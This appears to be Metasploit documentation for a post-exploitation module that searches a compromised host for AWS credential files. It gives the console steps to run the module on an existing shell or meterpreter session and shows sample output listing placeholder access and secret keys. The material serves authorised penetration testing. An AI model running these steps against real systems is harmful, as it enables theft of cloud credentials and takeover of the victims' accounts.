## Vulnerable Application

  Any system with a `shell` or `meterpreter` session.

## Verification Steps

  1. Get a `shell` or `meterpreter` session on some host.
  2. Do: ```use post/multi/gather/aws_keys```
  3. Do: ```set SESSION [SESSION_ID]```, replacing ```[SESSION_ID]``` with the session number you wish to run this one.
  4. Do: ```run```
  5. If the system has readable configuration files containing AWS key material, they will be printed out.

## Options

  None.

## Scenarios

  ```
msf post(aws_keys) > run

[*] Enumerating possible user AWS config files
[*] Looking for AWS config/credentials files in /bin
[*] Looking for AWS config/credentials files in /dev
[*] Looking for AWS config/credentials files in /home/syslog
[*] Looking for AWS config/credentials files in /home/test
[*] Looking for AWS config/credentials files in /home/test  ubuntu
[*] Looking for AWS config/credentials files in /home/ubuntu
[*] Looking for AWS config/credentials files in /nonexistent
[*] Looking for AWS config/credentials files in /root
[*] Looking for AWS config/credentials files in /usr/games
[*] Looking for AWS config/credentials files in /usr/sbin
[*] Looking for AWS config/credentials files in /var/backups
[*] Looking for AWS config/credentials files in /var/cache/man
[*] Looking for AWS config/credentials files in /var/cache/pollinate
[*] Looking for AWS config/credentials files in /var/lib/gnats
[*] Looking for AWS config/credentials files in /var/lib/landscape
[*] Looking for AWS config/credentials files in /var/lib/libuuid
[*] Looking for AWS config/credentials files in /var/list
[*] Looking for AWS config/credentials files in /var/mail
[*] Looking for AWS config/credentials files in /var/run/dbus
[*] Looking for AWS config/credentials files in /var/run/ircd
[*] Looking for AWS config/credentials files in /var/run/sshd
[*] Looking for AWS config/credentials files in /var/spool/lpd
[*] Looking for AWS config/credentials files in /var/spool/news
[*] Looking for AWS config/credentials files in /var/spool/uucp
[*] Looking for AWS config/credentials files in /var/www
AWS Key Data
============

Source                         AWS_ACCESS_KEY_ID  AWS_SECRET_ACCESS_KEY  Profile
------                         -----------------  ---------------------  -------
/home/test/.aws/credentials    BAR                PRIVATE_TEST           test
/home/ubuntu/.aws/credentials  ABC456             PRIVATE_TEST           test
/root/.s3cfg                   root_key           root_secret            default
```
